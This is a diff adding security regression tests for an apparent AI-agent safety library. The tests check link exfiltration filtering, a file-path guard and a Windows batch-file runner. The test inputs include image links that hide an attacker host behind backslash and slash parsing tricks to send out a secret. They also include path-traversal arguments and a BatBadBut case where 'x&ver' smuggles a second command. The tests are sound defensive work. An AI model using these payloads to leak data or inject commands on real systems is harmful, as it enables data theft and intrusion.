@@ -8,6 +8,7 @@ from __future__ import annotations
 
 import http.server
 import json
+import os
 import sys
 import threading
 import time
@@ -261,6 +262,54 @@ def test_network_path_reference_images_are_treated_as_external(markup):
 
 def test_network_path_reference_to_an_allowed_host_is_fine():
     assert not ExfilLinkValidator(allowed_hosts=["ok.example"]).check("![x](//ok.example/p.png)")
+
+
+@pytest.mark.parametrize(
+    "markup",
+    [
+        "![x](https://attacker.example\\@ok.example/p.png?d=SECRET)",
+        '<img src="https://attacker.example\\@ok.example/p.png?d=SECRET">',
+        # Browsers accept any number of slashes after http(s):; urlsplit finds no host.
+        '<img src="https:/attacker.example/p.png?d=SECRET">',
+        '<img src="https:///attacker.example/p.png?d=SECRET">',
+        "![x](https:attacker.example/p.png?d=SECRET)",
+        # A malformed bracketed host must be flagged, not crash the violation message.
+        '<img src="https://attacker.example\\@[bad]/p.png">',
+        '<img src="https://[bad]/p.png">',
+    ],
+)
+def test_backslash_before_userinfo_cannot_disguise_the_real_host(markup):
+    """urlsplit reads the host after '@', but browsers treat '\\' as '/' and fetch attacker."""
+    validator = ExfilLinkValidator(allowed_hosts=["ok.example"])
+    assert validator.check(markup)
+    assert "attacker.example" not in validator.sanitize(markup)
+
+
+def test_relative_path_argument_is_refused_because_the_tool_opens_it_against_cwd(tmp_path):
+    """The guard used to resolve 'x' under the root, then the tool opened 'x' under cwd."""
+    root = tmp_path / "ws"
+    root.mkdir()
+    policy = Policy.from_dict(
+        {"tools": {"read_file": {"args": {"path": {"type": "path", "roots": [str(root)]}}}}}
+    )
+    guard = ToolGuard(policy)
+    for value in ["secret.txt", "x/../secret.txt", "."]:
+        with pytest.raises(ToolDenied):
+            guard.execute(ToolCall("read_file", {"path": value}), lambda path: path)
+    assert guard.execute(ToolCall("read_file", {"path": str(root / "a")}), lambda path: path)
+
+
+@pytest.mark.skipif(sys.platform != "win32", reason="batch files only reparse args on Windows")
+def test_runner_refuses_batch_files_whose_args_cmd_exe_would_reparse(tmp_path, monkeypatch):
+    """BatBadBut: Popen(shell=False) still hands a .cmd to cmd.exe, so `x&ver` runs `ver`."""
+    # With "." in PATHEXT, which() accepts "tool.cmd." and Windows then runs tool.cmd.
+    monkeypatch.setenv("PATHEXT", os.environ.get("PATHEXT", ".COM;.EXE;.BAT;.CMD") + ";.")
+    for ext in (".cmd", ".bat"):
+        script = tmp_path / f"tool{ext}"
+        script.write_text("@echo %*\n")
+        for spelling in (str(script), str(script) + "."):
+            with pytest.raises(ValueError, match="batch file"):
+                SafeCommandRunner({"t": ExecRule(executable=spelling)}, cwd_roots=[str(tmp_path)])
 
 
 @pytest.mark.parametrize(
